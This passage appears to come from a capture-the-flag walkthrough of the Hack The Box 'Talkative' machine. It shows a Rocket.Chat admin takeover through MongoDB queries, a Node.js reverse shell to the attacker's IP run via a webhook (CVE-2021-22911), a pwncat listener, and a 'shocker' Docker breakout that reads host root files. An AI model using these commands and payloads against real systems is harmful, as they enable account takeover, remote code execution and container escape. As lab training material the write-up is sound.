{ "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y" }, "email" : { "verificationTokens" : [ { "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w", "address" : "saul@talkative.htb", "when" : ISODate("2021-08-10T19:49:48.738Z") } ] }, "resume" : { "loginTokens" : [ ] } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2022-06-24T11:39:06.274Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
rs0:PRIMARY> 
```
We got two user entrys but for now only one is interesting to us, because it has the admin role assigned and we can read his ```bcrypt``` password.

| Username  | Email | name  |  bcrypt password |
|---|---|---|---|
| Admin  |  saul@talkative.htb | Saul Goodman  | $2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y  |

Unfortunately I was not able to crack the hash with ```john```  and the ```rockyou``` wordlist. 

```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ cat hash                                                                                                                                            1 ⨯
$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y
                                                      
┌──(kali㉿kali)-[~/htb/talkative]
└─$ john hash --format=bcrypt -w /usr/share/wordlists/rockyou.txt                                                                                       1 ⨯
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:19 DONE (2022-06-24 22:01) 0g/s 177.5p/s 177.5c/s 177.5C/s targas..sss
Session completed. 
```

We got read-write privileges on the database, so it could be possible to just ```switch out``` the ```bcrypt``` hash.

I've cloned the repo, build the executable with ```make``` and created a new bcrypt hash:

```
┌──(kali㉿kali)-[~/htb/talkative/bcrypt-cli/out]
└─$ echo -n yeeb123 | ./bcrypt
$2a$10$BxYiPLLP1Smq6FWeLgJo.egyNp3Cy4NYcD9Ao0QqyHvCqQMR0lucm
```

After some trial and error (and a machine reset) I managed to get the mongodb query running and was able to switch out the bcrypt hash of admin.

```
rs0:PRIMARY> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : { "bcrypt" : "$2a$10$BxYiPLLP1Smq6FWeLgJo.egyNp3Cy4NYcD9Ao0QqyHvCqQMR0lucm" } } } })
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

Unfortunelty I was not able to login, probably I got the ```iteration counter``` wrong.
Well after some googleing I've found a way simpler approach: Setting a ```use-once login token``` for the admin account by following this offical guide:
https://docs.rocket.chat/guides/administration/advanced-admin-settings/restoring-an-admin

Payload/Query:
```
rs0:PRIMARY> db.getCollection('users').update({username:"admin"}, {$set: { "services":{"loginToken":{"token":"yeeb123"}}, "requirePasswordChange":true} })
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

URL to login:

http://talkative.htb:3000/login-token/yeeb123

I've set the new password to ```yeebyeeb``` and sucessfuly logged in.

### Exploiting rocketchat

There are no rooms just one bot named ```rocket.cat```, the bot was also in the database.

http://talkative.htb:3000/admin/info
In the settings we can find the version running is ```2.4.14```

Okay so apparently rocketchat version 2.4.14 is vulnerable to a NOSQL Injection vulnerability tracked as ```CVE-2021-22911```.

By reading some infromation about the exploit I noticed, that we don't need the full exploit chain since we are already got a user in the ```admin role```.

I've found this github page, that explains how we can use a ```Webhook Integration``` to execute code on the system:

https://github.com/CsEnox/CVE-2021-22911

I was not able to use the ```exec()``` funtion for code execution.
So i had to write a simple ```reverse shell``` directly as a python script:

```
const require = console.log.constructor('return process.mainModule.require')();
var net = require("net"),cp = require('child_process'), shell = cp.spawn("/bin/sh", []);
var s = new net.Socket();
s.connect(9001, "10.10.14.4", function(){
  s.pipe(shell.stdin);
  shell.stdout.pipe(s);
  shell.stderr.pipe(s);
});
```
### Another Docker Container
Again i used ```pwncat```, since it has a lot of cool features and it is a lot better than a simple ```nc``` listener with ```rlwrap```.
```
┌──(kali㉿kali)-[~]
└─$ /home/kali/.local/bin/pwncat-cs -lp 9001
[23:18:49] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
[23:18:50] received connection from 10.10.11.155:44728                                                                                            bind.py:84
[23:18:51] 0.0.0.0:9001: upgrading from /bin/dash to /bin/bash                                                                                manager.py:957
[23:18:52] 10.10.11.155:44728: registered new host w/ db                                                                                      manager.py:957
(local) pwncat$
Active Session: 10.10.11.155:44728  
```

One again we are now within a Docker container
```
(remote) root@c150397ccd63:/home# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
rocketchat:x:999:999::/home/rocketchat:/bin/sh
(remote) root@c150397ccd63:/home# ls /home
(remote) root@c150397ccd63:/home# 
```

```
(local) pwncat$ upload /home/kali/htb/talkative/serve/linpeas.sh /dev/shm
/dev/shm ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 776.8/776.8 KB • ? • 0:00:00
[23:25:22] uploaded 776.78KiB in 0.70 seconds 
```

```Linpeas``` did not run in ```/dev/shm``` so I've copied into ```/tmp/```



The output was a bit hard to interprete, since we are already root within the container, but that gave me the idea to look for some container breakouts.
https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/docker-breakout.md

### Docker Breakout

The first technique was not useful in this senario, because no docker socket was mountet. 
```
(remote) root@c150397ccd63:/tmp# find / -name docker.sock 2>/dev/null
(remote) root@c150397ccd63:/tmp# 
```

The second technique lacked some explanation but i've found additional explanation on ```hacktricks.xyz``` directly.
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

Getting the Capabilities from the bash process. ```Proc ID``` was provided by the ```linpeas.sh output```.

```
(remote) root@c150397ccd63:/tmp# cat /proc/488/status | grep Cap
CapInh: 0000000000000000
CapPrm: 00000000a80425fd
CapEff: 00000000a80425fd
CapBnd: 00000000a80425fd
CapAmb: 0000000000000000
```
Decoding the values to the right capabilities.
```
┌──(kali㉿kali)-[~]
└─$ capsh --decode=00000000a80425fd                                                                                                                     1 ⨯
0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Again, I've went trough the list of capabilties top to bottom and checked if any of those capabilties is helpful in a Docker Breakout.
Second capabiltiy was a hit: ```cap_dac_read_search```

Hacktricks links this technique to a Docker Breackout exploit named ```shocker```

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search

Compiled the binary from Hacktricks:
```
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ gcc shocker.c -o shocker
shocker.c: In function ‘find_handle’:
shocker.c:63:15: warning: implicit declaration of function ‘open_by_handle_at’ [-Wimplicit-function-declaration]
   63 |     if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
      |               ^~~~~~~~~~~~~~~~~
                                                                                              
```
Uploaded compiled shocker with pwncat:
```
(local) pwncat$ upload /home/kali/htb/talkative/serve/shocker /tmp/shocker
/tmp/shocker ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 17.3/17.3 KB • ? • 0:00:00
[00:10:02] uploaded 17.26KiB in 0.43 seconds 
```

#### Root FLag
```
(remote) root@c150397ccd63:/tmp# ./shocker /root/root.txt root
[***] docker VMM-container breakout Po(C) 2014 [***]
[***] The tea from the 90's kicks your sekurity again. [***]
[***] If you have pending sec consulting, I'll happily [***]
[***] forward to my friends who drink secury-tea too! [***]

<enter>
c^H
[*] Resolving 'root/root.txt'
[*] Found lib32
[*] Found ..
[*] Found lost+found
[*] Found sbin
[*] Found bin
[*] Found boot
[*] Found dev
[*] Found run
[*] Found lib64
[*] Found .
[*] Found var
[*] Found home
[*] Found media
[*] Found proc
[*] Found etc
[*] Found lib
[*] Found libx32
[*] Found cdrom
[*] Found root
[+] Match: root ino=18
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'root.txt'
[*] Found ..
[*] Found .backup
[*] Found .config
[*] Found .cache
[*] Found .local
[*] Found .ssh
[*] Found .
[*] Found .profile
[*] Found .bashrc
[*] Found root.txt
[+] Match: root.txt ino=110097
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root.txt) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
Success!!
(remote) root@c150397ccd63:/tmp# 
(remote) root@c150397ccd63:/tmp# cat ro
cat: ro: No such file or directory
(remote) root@c150397ccd63:/tmp# ll
bash: ll: command not found
(remote) root@c150397ccd63:/tmp# ls
passwd  peas  rocketchat-importer  root  shocker  ufs
(remote) root@c150397ccd63:/tmp# cat root 
[REDACTED]
```

So since I only was able to extract the ```root.txt``` file from the host and did not get  user session, i was intrigued to investiagte further.

* I checked for ssh keys in the home directory of root - no luck
* extracted ```/etc/passwd``` and ```/etc/shadow``` and tried to crack the hash of root - no luck
* I decided to not bother anymore and stopped my investigation. Probably a different capabilty will provide a shell.